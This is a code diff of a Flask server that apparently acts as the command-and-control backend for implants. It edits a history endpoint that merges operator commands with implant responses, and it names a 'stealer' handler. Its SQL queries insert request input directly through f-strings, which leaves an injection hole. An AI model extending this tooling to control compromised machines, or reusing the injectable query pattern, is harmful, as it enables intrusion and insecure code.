@@ -295,6 +295,9 @@ def handle_response_stealer():
 
 # Implant response endpoint, in json
 
+# Addisons Worktime -
+# Attempting to add encryption
+
 
 @app.route("/response_data", methods=["POST"])
 @cross_origin()
@@ -435,25 +438,19 @@ def testThis():
         print(error)
         return error, 401, {'Access-Control-Allow-Origin': '*'}
 
-# Gets log history of a particular implant
-
-
+# Gets log history of a particular implant, for console
 @app.route("/get_history", methods=["POST"])
 def get_history():
     try:
-
         data = request.json
         id = data['id']
 
         pending = tools.executeSelectQuery(
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'untouched\')")
-
         executed = tools.executeSelectQuery(
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executed\')")
-
         executing = tools.executeSelectQuery(
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executing\')")
-        print(f"this is executing responses: {executing}")
         # "success": x[-3]
         # [(2, 1, 'implant', datetime.datetime(2022, 12, 1, 16, 58, 44, 674016), 'untouched', responseData, success, recieved, creator)
         pending = [{"sender": "user", "creator": x[-1],
@@ -461,9 +458,12 @@ def get_history():
         combined = [{"sender": "user", "creator": x[-1],
                      "time":x[3], "command":x[2]} for x in executing]
         combined += [{"sender": "implant", "time": x[-2],
+                      "command":x[2], "response":x[-4]} for x in executing]
+        combined += [{"sender": "user", "creator": x[-1],
+                     "time":x[3], "command":x[2]} for x in executed]
+        combined += [{"sender": "implant", "time": x[-2],
                       "command":x[2], "response":x[-4]} for x in executed]
         combined += pending
-
         sortedList = sorted(combined, key=lambda x: x['time'])
 
         return {"sorted": sortedList}, 200, {'Access-Control-Allow-Origin': '*'}
@@ -472,21 +472,3 @@ def get_history():
         return e, {'Access-Control-Allow-Origin': '*'}
 
     # Construct a linear history of commands -> responses
-
-# for testing
-# def main():
-#     target_implant_id = 1
-#     command = 'some long command'
-#     created_on = '2022-12-01T16:41:10.592868'
-#     status = 'untouched'
-#     data = [target_implant_id, command, created_on, status]
-#     columns = ['target_implant_id', 'command', 'created_on', 'status']
-
-#     query = insertQueryBuilder('task_queue', columns)
-#     results = executeInsertQuery(query, data)
-
-#     print(results)
-
-
-# if __name__ == "__main__":
-#     main()
